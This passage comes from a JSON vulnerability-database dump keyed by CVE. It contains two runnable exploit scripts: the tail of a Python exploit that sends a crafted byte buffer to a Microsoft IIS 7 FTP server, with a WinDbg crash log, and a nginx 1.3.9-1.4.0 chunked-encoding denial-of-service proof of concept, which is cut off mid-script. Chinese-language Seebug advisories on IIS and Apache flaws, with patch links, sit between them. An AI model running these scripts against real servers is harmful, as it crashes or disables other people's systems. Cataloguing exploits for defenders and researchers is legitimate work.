xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\"\r\n\"\\xef\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xfe\\xff\\xef\\xbb\"\r\n\"\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xfe\\xff\\xff\\xef\\xff\\xef\"\r\n\"\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xff\\xef\\xfe\\xff\\xef\\xbb\"\r\n\"\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\"\r\n\"\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xfe\"\r\n\"\\xff\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\"\r\n\"\\xbf\\xff\\xef\\xfe\\xff\\xfe\\xff\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\"\r\n\"\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xff\\xef\\xfe\\xff\\xff\\xef\\xef\"\r\n\"\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\"\r\n\"\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\"\r\n\"\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xff\\xef\\xfe\\xff\\xfe\\xff\"\r\n\"\\xef\\xbb\\xbf\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xff\"\r\n\"\\xef\\xfe\\xff\\xff\\xef\\xff\\xef\\xff\\xef\\xff\\xef\\xfe\\xff\\xfe\\xff\\xef\"\r\n\"\\xbb\\xbf\\xff\\xef\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\"\r\n\"\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\"\r\n\"\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\"\r\n\"\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xef\\xbb\\xbf\\xef\"\r\n\"\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\"\r\n\"\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\"\r\n\"\\xff\\xfe\\xff\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xff\"\r\n\"\\xef\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\"\r\n\"\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\"\r\n\"\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xff\"\r\n\"\\xef\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xfe\"\r\n\"\\xff\\xff\\xef\\xfe\\xff\\xfe\\xff\\xff\\xef\\xff\\xef\\xfe\\xff\\xff\\xef\\xff\"\r\n\"\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xef\\xbb\"\r\n\"\\xbf\\xff\\xef\\xfe\\xff\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\"\r\n\"\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xff\\xef\\xff\\xef\\xff\\xef\\xff\\xef\"\r\n\"\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xff\\xef\\xff\\xef\\xfe\\xff\\xef\"\r\n\"\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xef\"\r\n\"\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\"\r\n\"\\xff\\xef\\xff\\xef\"\r\n\"\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\"\r\n\"\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xef\"\r\n\"\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\"\r\n\"\\xef\\xff\\xef\\xfe\\xff\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\"\r\n\"\\xef\\xff\\xef\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\"\r\n\"\\xbf\\xff\\xef\\xff\\xef\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xff\\xef\\xfe\"\r\n\"\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\"\r\n\"\\xff\\xef\\xff\\xef\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xff\\xef\"\r\n\"\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xef\"\r\n\"\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xef\"\r\n\"\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\"\r\n\"\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xff\\xef\\xef\\xbb\"\r\n\"\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xfe\\xff\\xfe\\xff\\xfe\"\r\n\"\\xff\\xfe\\xff\\xff\\xef\\xff\\xef\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\"\r\n\"\\xef\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xff\"\r\n\"\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xfe\\xff\\xfe\"\r\n\"\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xff\\xef\\xff\"\r\n\"\\xef\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xff\\xef\\xff\"\r\n\"\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\\xff\\xef\"\r\n\"\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xef\\xbb\"\r\n\"\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\"\r\n\"\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xff\\xef\\xef\\xbb\\xbf\"\r\n\"\\xff\\xef\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\"\r\n\"\\xbf\\xfe\\xff\\xff\\xef\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xff\\xef\"\r\n\"\\xff\\xef\\xff\\xef\\xef\\xbb\\xbf\\xfe\\xff\\xff\\xef\\xef\\xbb\\xbf\\xff\\xef\"\r\n\"\\xfe\\xff\\xef\\xbb\\xbf\\xfe\\xff\\xef\\xbb\\xbf\\xef\\xbb\\xbf\\xef\\xbb\\xbf\")\r\n\r\n\r\ndef usage():\r\n        print \"usage  : ./msiis7ftp.py <victim_ip>  <victim_port>\"\r\n        print \"example: ./msiis7ftp.py 192.168.1.22 21\"\r\n\r\ndef main(): \r\n\tif len(sys.argv) != 3:\r\n    \t\tusage()\r\n        \tsys.exit()\r\n\r\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\r\n\tHOST = sys.argv[1]\r\n\tPORT = int(sys.argv[2])\r\n\ts.connect((HOST,PORT))\r\n\tdata = s.recv(1024)\r\n\tprint data\r\n\tprint \"[*] Sending Payload...\\n\"\r\n\ts.send(buf+'\\r\\n')\r\n\tprint \"[*] Closing Socket...\\n\"\r\n\ts.close()\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n\r\n\r\n------------------------------------------------------------------------------\r\nModLoad: 75500000 75516000   C:\\Windows\\system32\\CRYPTSP.dll\r\nModLoad: 752a0000 752db000   C:\\Windows\\system32\\rsaenh.dll\r\nModLoad: 72090000 720be000   C:\\Windows\\system32\\mlang.dll\r\nModLoad: 75090000 7509b000   C:\\Windows\\system32\\pcwum.DLL\r\nModLoad: 75a70000 75a7e000   C:\\Windows\\system32\\RpcRtRemote.dll\r\n(22c.c10): Break instruction exception - code 80000003 (first chance)\r\neax=7ffaf000 ebx=00000000 ecx=00000000 edx=779cd315 esi=00000000 edi=00000000\r\neip=77963574 esp=00ccfc38 ebp=00ccfc64 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Windows\\SYSTEM32\\ntdll.dll - \r\nntdll!DbgBreakPoint:\r\n77963574 cc              int     3\r\n0:012> g\r\n(22c.31c): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=00000000 ebx=0000003c ecx=0050291c edx=0000003b esi=005e5fc0 edi=00500000\r\neip=77986167 esp=00abf6b4 ebp=00abf794 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\nntdll!RtlPrefixUnicodeString+0x84c:\r\n77986167 8b4814          mov     ecx,dword ptr [eax+14h] ds:0023:00000014=????????\r\n0:006> g\r\n(22c.31c): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=005e5fc8 ebx=005e7fc8 ecx=b083ef27 edx=efb083ef esi=005e5fc0 edi=00500000\r\neip=77986030 esp=00abf674 ebp=00abf69c iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\nntdll!RtlPrefixUnicodeString+0x715:\r\n77986030 8b4904          mov     ecx,dword ptr [ecx+4] ds:0023:b083ef2b=????????\r\n0:006> g\r\nCritical error detected c0000374\r\n(22c.31c): Break instruction exception - code 80000003 (first chance)\r\neax=00000000 ebx=00000000 ecx=77950805 edx=00abe7a9 esi=00500000 edi=00515520\r\neip=779f28e5 esp=00abe9fc ebp=00abea74 iopl=0         nv up ei pl nz na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\r\nntdll!RtlpNtMakeTemporaryKey+0x1a49:\r\n779f28e5 cc              int     3\r\n0:006> g\r\n(22c.31c): Unknown exception - code c0000374 (first chance)\r\n(22c.31c): Unknown exception - code c0000374 (!!! second chance !!!)\r\neax=00abea0c ebx=00000000 ecx=77950805 edx=00abe7a9 esi=00500000 edi=00515520\r\neip=779f2913 esp=00abe9fc ebp=00abea74 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\r\nntdll!RtlpNtMakeTemporaryKey+0x1a77:\r\n779f2913 eb12            jmp     ntdll!RtlpNtMakeTemporaryKey+0x1a8b (779f2927)\r\n0:006> g\r\nWARNING: Continuing a non-continuable exception\r\n(22c.31c): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000\r\neip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\nntdll!RtlTimeFieldsToTime+0x1d7:\r\n7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????\r\n0:006> g\r\n(22c.31c): Access violation - code c0000005 (!!! second chance !!!)\r\neax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000\r\neip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\nntdll!RtlTimeFieldsToTime+0x1d7:\r\n7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????\r\n0:006> g\r\n(22c.31c): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000\r\neip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\nntdll!RtlTimeFieldsToTime+0x1d7:\r\n7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????\r\n0:006> g\r\n(22c.31c): Access violation - code c0000005 (!!! second chance !!!)\r\neax=00000000 ebx=0050299c ecx=00000011 edx=0000003b esi=00000000 edi=00000000\r\neip=7798c64e esp=00abf8a4 ebp=00abf974 iopl=0         nv up ei pl zr na pe nc\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\nntdll!RtlTimeFieldsToTime+0x1d7:\r\n7798c64e 8b4714          mov     eax,dword ptr [edi+14h] ds:0023:00000014=????????\r\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:15803"
        }
    ],
    "CVE-2012-2531": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 56439\r\nCVE ID: CVE-2012-2531\r\n\r\nInternet Information Services\uff08IIS\uff0c\u4e92\u8054\u7f51\u4fe1\u606f\u670d\u52a1\uff09\u662f\u7531\u5fae\u8f6f\u516c\u53f8\u63d0\u4f9b\u7684\u57fa\u4e8e\u8fd0\u884cMicrosoft Windows\u7684\u4e92\u8054\u7f51\u57fa\u672c\u670d\u52a1\u3002\r\n\r\nMicrosoft IIS 7.5\u5bf9\u64cd\u4f5c\u65e5\u5fd7\u4f7f\u7528\u4e86\u5f31\u6743\u9650\uff0c\u6ca1\u6709\u6b63\u786e\u9650\u5236\u5bf9\u67d0\u4e9b\u65e5\u5fd7\u6587\u4ef6\u7684\u8bbf\u95ee\uff0c\u901a\u8fc7\u8bfb\u53d6\u6b64\u6587\u4ef6\uff0c\u53ef\u5141\u8bb8\u672c\u5730\u7528\u6237\u83b7\u53d6\u5df2\u914d\u7f6e\u8d26\u6237\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u8981\u5229\u7528\u6b64\u6f0f\u6d1e\u9700\u8981\u542f\u7528IIS\u7684\u64cd\u4f5c\u65e5\u5fd7\u3002\r\n0\r\nMicrosoft IIS 7.x\r\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u5982\u679c\u5df2\u7ecf\u542f\u7528\u4e86IIS\u7684&quot;Operational&quot;\u65e5\u5fd7\uff0c\u5219\u5728\u5206\u914d\u7ed9\u5e94\u7528\u6c60\u81ea\u5b9a\u4e49\u8d26\u6237\u4e4b\u524d\uff0c\u8bf7\u7981\u7528\r\nIIS\u914d\u7f6e\u7684&quot;Operational&quot;\uff0c\u7136\u540e\u5728\u5173\u8054\u4e86\u8d26\u6237\u4e4b\u540e\uff0c\u91cd\u542f&quot;Operational&quot;\u65e5\u5fd7\u3002\r\n\r\n* \u4f7f\u7528\u5185\u7f6e\u8d26\u6237ID\uff08\u4f8b\u5982LocalService, ApplicationPoolIdentity,\u7b49\uff09\u800c\u975e\u5e94\u7528\u6c60\u5185\r\n\u7684\u81ea\u5b9a\u4e49\u8d26\u6237\u3002\r\n\r\n* \u963b\u6b62\u975e\u7ba1\u7406\u5458\u8d26\u6237\u8bbf\u95eeEventViewer\u5d4c\u5165\u5f0f\u7ba1\u7406\u5355\u5143\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS12-073\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\n\r\nMS12-073\uff1aVulnerabilities in Microsoft Internet Information Services (IIS) Could Allow Information Disclosure (2733829)\r\n\r\n\u94fe\u63a5\uff1ahttp://www.microsoft.com/technet/security/bulletin/MS12-073.asp",
            "modified": "2012-11-19T00:00:00",
            "published": "2012-11-19T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60465",
            "id": "SSV:60465",
            "type": "seebug",
            "title": "Microsoft IIS \u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\uff08MS12-073)",
            "sourceData": "",
            "cvss": {
                "score": 2.1,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60465"
        }
    ],
    "CVE-2012-2532": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 56440\r\nCVE ID: CVE-2012-2532\r\n\r\nInternet Information Services\uff08IIS\uff0c\u4e92\u8054\u7f51\u4fe1\u606f\u670d\u52a1\uff09\u662f\u7531\u5fae\u8f6f\u516c\u53f8\u63d0\u4f9b\u7684\u57fa\u4e8e\u8fd0\u884cMicrosoft Windows\u7684\u4e92\u8054\u7f51\u57fa\u672c\u670d\u52a1\u3002\r\n\r\nMicrosoft IIS FTP\u670d\u52a1\u5728\u4e0e\u52a0\u5bc6\u901a\u8baf\u6e20\u9053\u534f\u5546\u65f6\uff0c\u5b58\u5728\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u3002\u901a\u8fc7\u67d0\u4e9bFTP\u547d\u4ee4\u53ef\u6cc4\u9732\u67d0\u4e9b\u4fe1\u606f\u3002\r\n0\r\nMicrosoft IIS 7.x\r\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u5982\u679c\u5df2\u7ecf\u542f\u7528\u4e86IIS\u7684&quot;Operational&quot;\u65e5\u5fd7\uff0c\u5219\u5728\u5206\u914d\u7ed9\u5e94\u7528\u6c60\u81ea\u5b9a\u4e49\u8d26\u6237\u4e4b\u524d\uff0c\u8bf7\u7981\u7528\r\nIIS\u914d\u7f6e\u7684&quot;Operational&quot;\uff0c\u7136\u540e\u5728\u5173\u8054\u4e86\u8d26\u6237\u4e4b\u540e\uff0c\u91cd\u542f&quot;Operational&quot;\u65e5\u5fd7\u3002\r\n\r\n* \u4f7f\u7528\u5185\u7f6e\u8d26\u6237ID\uff08\u4f8b\u5982LocalService, ApplicationPoolIdentity,\u7b49\uff09\u800c\u975e\u5e94\u7528\u6c60\u5185\r\n\u7684\u81ea\u5b9a\u4e49\u8d26\u6237\u3002\r\n\r\n* \u963b\u6b62\u975e\u7ba1\u7406\u5458\u8d26\u6237\u8bbf\u95eeEventViewer\u5d4c\u5165\u5f0f\u7ba1\u7406\u5355\u5143\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS12-073\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\n\r\nMS12-073\uff1aVulnerabilities in Microsoft Internet Information Services (IIS) Could Allow Information Disclosure (2733829)\r\n\r\n\u94fe\u63a5\uff1ahttp://www.microsoft.com/technet/security/bulletin/MS12-073.asp",
            "modified": "2012-11-19T00:00:00",
            "published": "2012-11-19T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60466",
            "id": "SSV:60466",
            "type": "seebug",
            "title": "Microsoft IIS FTP\u670d\u52a1\u8fdc\u7a0b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff08MS12-073)",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60466"
        }
    ],
    "CVE-2010-2068": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 42102\r\nCVE(CAN) ID: CVE-2010-2791\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server\u7684mod_proxy_http\u6a21\u5757\u4e2d\u7684mod_proxy_http.c\u6587\u4ef6\u6ca1\u6709\u6b63\u786e\u5730\u68c0\u6d4b\u8d85\u65f6\uff0c\u5728\u67d0\u4e9b\u8d85\u65f6\u60c5\u51b5\u4e0b\u670d\u52a1\u5668\u53ef\u80fd\u8fd4\u56de\u5c5e\u4e8e\u5176\u4ed6\u7528\u6237\u7684\u54cd\u5e94\uff0c\u5bfc\u81f4\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\u3002\u4ec5\u6709\u53ef\u89e6\u53d1\u4f7f\u7528\u4ee3\u7406worker\u6c60\u7684\u914d\u7f6e\u624d\u53d7\u5f71\u54cd\u3002\r\n\r\n\u8be5\u6f0f\u6d1e\u4e0eCVE-2010-2068\u4e2d\u6240\u8ff0\u6f0f\u6d1e\u76f8\u540c\uff0c\u4f46\u5f71\u54cd\u7684\u662fUnix\u7cfb\u7edf\u4e0a\u7684httpd\u3002\n\nApache 2.2.9\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://svn.apache.org/viewvc?view=revision&amp;revision=699841",
            "modified": "2010-08-03T00:00:00",
            "published": "2010-08-03T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20012",
            "id": "SSV:20012",
            "type": "seebug",
            "title": "Unix\u5e73\u53f0Apache mod_proxy_http\u6a21\u5757\u8d85\u65f6\u5904\u7406\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20012"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 40827\r\nCVE ID: CVE-2010-2068\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server\u7684mod_proxy_http\u6a21\u5757\u4e2d\u7684mod_proxy_http.c\u6587\u4ef6\u6ca1\u6709\u6b63\u786e\u5730\u68c0\u6d4b\u8d85\u65f6\uff0c\u5728\u67d0\u4e9b\u8d85\u65f6\u60c5\u51b5\u4e0b\u670d\u52a1\u5668\u53ef\u80fd\u8fd4\u56de\u5c5e\u4e8e\u5176\u4ed6\u7528\u6237\u7684\u54cd\u5e94\uff0c\u5bfc\u81f4\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\u3002\u4ec5\u6709\u53ef\u89e6\u53d1\u4f7f\u7528\u4ee3\u7406worker\u6c60\u7684\u914d\u7f6e\u624d\u53d7\u5f71\u54cd\u3002\n\nApache 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/security/vulnerabilities_22.html",
            "modified": "2010-06-21T00:00:00",
            "published": "2010-06-21T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-19828",
            "id": "SSV:19828",
            "type": "seebug",
            "title": "Apache mod_proxy_http\u6a21\u5757\u8d85\u65f6\u5904\u7406\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:19828"
        }
    ],
    "CVE-2013-2070": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category dos / poc",
            "modified": "2013-05-18T00:00:00",
            "published": "2013-05-18T00:00:00",
            "id": "1337DAY-ID-20785",
            "href": "https://0day.today/exploit/description/20785",
            "type": "zdt",
            "title": "nginx 1.3.9-1.4.0 DoS PoC",
            "sourceData": "# Exploit Title: nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2070)\r\n# Google Dork: CVE-2013-2070\r\n# Date: 16.05.2013\r\n# Exploit Author: Mert SARICA - mert [ . ] sarica [ @ ] gmail [ . ] com - http://www.mertsarica.com\r\n# Vendor Homepage: http://nginx.org/\r\n# Software Link: http://nginx.org/download/nginx-1.4.0.tar.gz\r\n# Version: 1.3.9-1.4.0\r\n# Tested on: Kali Linux & nginx v1.4.0\r\n# CVE : CVE-2013-2070\r\n \r\nimport httplib\r\nimport time\r\nimport socket\r\nimport sys\r\nimport os\r\n \r\n# Vars & Defs\r\ndebug = 0\r\ndos_packet = 0xFFFFFFFFFFFFFFEC\r\nsocket.setdefaulttimeout(1)\r\n \r\npacket = 0\r\n \r\ndef chunk(data, chunk_size):\r\n    chunked = \"\"\r\n    chunked += \"%s\\r\\n\" % (chunk_size)\r\n    chunked += \"%s\\r\\n\" % (data)\r\n    chunked += \"0\\r\\n\\r\\n\"\r\n    return chunked\r\n \r\nif sys.platform == 'linux-i386' or sys.platform == 'linux2':\r\n        os.system(\"clear\")\r\nelif sys.platform == 'win32':\r\n        os.system(\"cls\")\r\nelse:\r\n        os.system(\"cls\")\r\n                 \r\nprint \"======================================================================\"\r\nprint u\"nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2070) [http://www.mertsarica.com]\"\r\nprint \"======================================================================\"\r\n \r\nif len(sys.argv) < 2:\r\n        print \"Usage: python nginx_dos.py [target ip]\\n\"\r\n        print \"Example: python nginx_dos.py 127.0.0.1\\n\"\r\n        sys.exit(1)\r\nelse:\r\n    host = sys.argv[1].lower()\r\n         \r\nwhile packet <= 5:\r\n \r\n    body = \"Mert SARICA\"\r\n    chunk_size = hex(dos_packet + 1)[3:]\r\n    chunk_size = (\"F\" + chunk_size[:len(chunk_size)-1]).upper()\r\n \r\n    if debug:\r\n        print \"data length:\", len(body), \"chunk size:\", chunk_size[:len(chunk_size)]\r\n \r\n    try:\r\n        con = httplib.HTTPConnection(host)\r\n        url = \"/mertsarica.php\"\r\n        con.putrequest('POST', url)\r\n        con.putheader('User-Agent', \"curl/7.30.0\")\r\n        con.putheader('Accept', \"*/*\")\r\n        con.putheader('Transfer-Encoding', 'chunked')\r\n        con.putheader('Content-Type', \"application/x-www-form-urlencoded\")\r\n        con.endheaders()\r\n        con.send(chunk(body, chunk_size[:len(chunk_size)]))\r\n    except:\r\n        print \"Connection error!\"\r\n        sys.exit(1)\r\n         \r\n    try:\r\n        resp = con.getresponse()\r\n        print(resp.status, resp.reason)\r\n    except:\r\n        print \"[*] Knock knock, is anybody there ? (\" + str(packet) + \"/5)\"\r\n \r\n    packet = 